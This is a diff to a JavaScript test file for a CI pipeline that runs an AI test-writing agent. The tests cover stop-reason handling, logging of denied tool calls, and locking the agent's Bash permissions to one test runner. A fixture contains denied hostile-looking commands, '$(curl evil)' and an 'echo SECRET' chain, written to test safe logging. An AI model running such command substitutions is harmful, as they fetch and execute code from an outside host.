@@ -90,8 +90,8 @@ test('a clean exit without completed keeps the agent\'s stable tests as a limit,
   const d = finalize({ decisions: partial, gate, exitCode: 0, log: '{"subtype":"success"}' })
   assert.equal(d.not_completed_reason, 'attempt_limit')
   assert.deepEqual(d.files.map((f) => f.outcome), ['tests_written', 'limit_reached'])
-  const own = finalize({ decisions: { ...partial, not_completed_reason: 'time_limit' }, gate, exitCode: 0, log: '' })
-  assert.equal(own.not_completed_reason, 'time_limit')
+  const own = finalize({ decisions: { ...partial, not_completed_reason: 'spend_limit' }, gate, exitCode: 0, log: '' })
+  assert.equal(own.not_completed_reason, 'spend_limit') // any other reason the agent gives is kept
 })
 
 test('a timeout over as many files as the gate allows still yields a valid decisions file', () => {
@@ -167,4 +167,25 @@ test('the decisions file status names schema problems by field path, without val
 test('a denied Bash call is logged with its program name only', () => {
   const result = { type: 'result', subtype: 'success', num_turns: 3, total_cost_usd: 0.01, permission_denials: [{ tool_name: 'Bash', tool_input: { command: 'npx vitest run tests/x.test.ts && echo SECRET' } }, { tool_name: 'Bash', tool_input: { command: '$(curl evil)' } }] }
   assert.equal(runSummary(JSON.stringify(result)), 'claude: subtype=success turns=3 cost_usd=0.01 denials=2 (Bash npx, Bash)')
+})
+
+test('the agent runs tests only through the runner copied into the working copy (Claude Code denies ../ paths)', async () => {
+  const { readFileSync } = await import('node:fs')
+  const read = (p) => readFileSync(new URL(p, import.meta.url), 'utf8')
+  const allowBash = JSON.parse(read('../test-agent/claude-settings.json')).permissions.allow.filter((r) => r.startsWith('Bash('))
+  assert.deepEqual(allowBash, ['Bash(node .test-agent/bin/run-tests.mjs *)'])
+  for (const doc of ['../../.claude/agents/test-agent.md', '../../.claude/skills/backend-unit-tests/SKILL.md', '../../.claude/skills/frontend-unit-tests/SKILL.md']) {
+    const text = read(doc)
+    assert.match(text, /node \.test-agent\/bin\/run-tests\.mjs /, doc)
+    assert.ok(!/run-tests\.mjs/.test(text.replace(/node \.test-agent\/bin\/run-tests\.mjs/g, '')), `${doc} names another runner path`)
+  }
+  const yml = read('../workflows/test-agent.yml')
+  assert.match(yml, /rm -rf repo\/\.test-agent/) // nothing the pull request committed there survives
+  assert.match(yml, /cp ((?:\.\.\/)?main\/\.github\/scripts\/(?:run-tests|rules|sandbox)\.mjs ){3}\.test-agent\/bin\//)
+})
+
+test('a time_limit the agent wrote itself is not a time limit unless the run was cut off', () => {
+  const d = finalize({ decisions: { ...structuredClone(samples.decisions), completed: false, not_completed_reason: 'time_limit', files: [] }, gate: samples.gate, exitCode: 0, log: '' })
+  assert.equal(d.not_completed_reason, 'attempt_limit')
+  assert.equal(finalize({ decisions: { ...structuredClone(samples.decisions), completed: false, not_completed_reason: 'time_limit' }, gate: samples.gate, exitCode: 124, log: '' }).not_completed_reason, 'time_limit')
 })
